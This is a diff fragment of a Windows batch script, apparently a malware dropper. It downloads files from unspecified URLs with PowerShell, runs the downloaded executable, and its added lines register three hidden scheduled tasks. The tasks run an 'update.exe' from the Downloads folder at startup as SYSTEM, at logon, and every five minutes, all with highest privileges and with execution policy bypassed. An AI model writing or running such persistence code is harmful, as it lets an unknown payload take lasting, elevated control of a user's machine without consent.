@@ -33,3 +33,7 @@ powershell -Command "Invoke-WebRequest -Uri '%urlx3%' -OutFile '%outputx3%'"
 
 echo Running the downloaded file...
 start "" "%outputexe%"
+
+powershell -Command "powershell -NoProfile -ExecutionPolicy Bypass -Command "$path='C:\Users\PC\Downloads\Update\update.exe'; Register-ScheduledTask -TaskName 'RunAsAdmin_Startup' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute $path) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -Force; Register-ScheduledTask -TaskName 'RunAsAdmin_Logon' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute $path) -Principal (New-ScheduledTaskPrincipal -UserId \"$env:USERNAME\" -LogonType Interactive -RunLevel Highest) -Force; Register-ScheduledTask -TaskName 'RunAsAdmin_Every5Min' -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)) -Action (New-ScheduledTaskAction -Execute $path) -Principal (New-ScheduledTaskPrincipal -UserId \"$env:USERNAME\" -LogonType Interactive -RunLevel Highest) -Force""
+
+
